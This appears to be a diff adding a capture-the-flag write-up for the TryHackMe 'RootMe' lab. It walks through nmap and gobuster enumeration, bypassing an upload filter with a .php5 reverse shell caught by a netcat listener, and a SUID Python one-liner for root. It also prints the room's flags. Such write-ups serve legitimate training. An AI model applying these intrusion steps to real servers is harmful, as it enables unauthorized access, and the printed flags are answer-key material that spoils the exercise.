@@ -1,0 +1,86 @@
+RootMe
+
+ip address: 10.10.150.80
+
+First step: Scan with nmap for open ports.
+nmap -sV 10.10.150.80
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Now I ll look for hidden directories. 
+/robots.txt in the end of the ip address does not show any hidden directory, so I ll try with go buster.
+
+gobuster dir -u 10.10.150.80 -w /usr/share/wordlists/dirb/big.txt 
+
+This command calls the gobuster tool and searches for hidden directories with every word from that wordlist
+
+/.htaccess            (Status: 403) [Size: 277]
+/.htpasswd            (Status: 403) [Size: 277]
+/css                  (Status: 301) [Size: 310] [--> http://10.10.150.80/css/]
+/js                   (Status: 301) [Size: 309] [--> http://10.10.150.80/js/]
+/panel                (Status: 301) [Size: 312] [--> http://10.10.150.80/panel/]
+/server-status        (Status: 403) [Size: 277]
+/uploads              (Status: 301) [Size: 314] [--> http://10.10.150.80/uploads/]
+Progress: 20469 / 20470 (100.00%)
+
+This is what was found.
+The panel directorys allows me to submit a file. 
+And at the /uploads I can see every delivered file and maybe execute them.
+So my first thought was to send a malicious coded file and execute it so I can get a shell
+at the server.
+
+With a firefox extension named "Wappalyzer" I saw that the programming language used is PHP.
+So I ll send a malicious php file.
+
+A .php file is not allowed to be send, so I ll use php5.
+I searched for a php reverse-shell and changed the LHOSTS.
+I need to open netcat to listen on the port I chose (1234).
+nc -lvnp 1234
+Success! Now I ll execute it from the uploads page.
+Done. We re in.
+
+Now I ll look for the flag in the user.txt.
+
+I used the command:
+find / -name user.txt
+
+So I could find the directory to the txt file.
+
+/var/www/user.txt
+Here it is.
+
+cat /var/www/user.txt
+THM{y0u_g0t_a_sh3ll}
+
+And I found the flag!
+
+Now I ll try to privilege escalate.
+
+find . -perm /4000 
+
+WIth this command I can figure out tools that use root privileges.
+If I send a command that uses root with these tools I can escalate to root.
+
+Python is the weird tool to be in that permission.
+
+/usr/bin/./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+I used this command to gain root.
+
+$ /usr/bin/./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+whoami
+root
+
+
+cd root
+ls
+cat root.txt
+
+And the final flag is: THM{pr1v1l3g3_3sc4l4t10n}
+
+
+
+
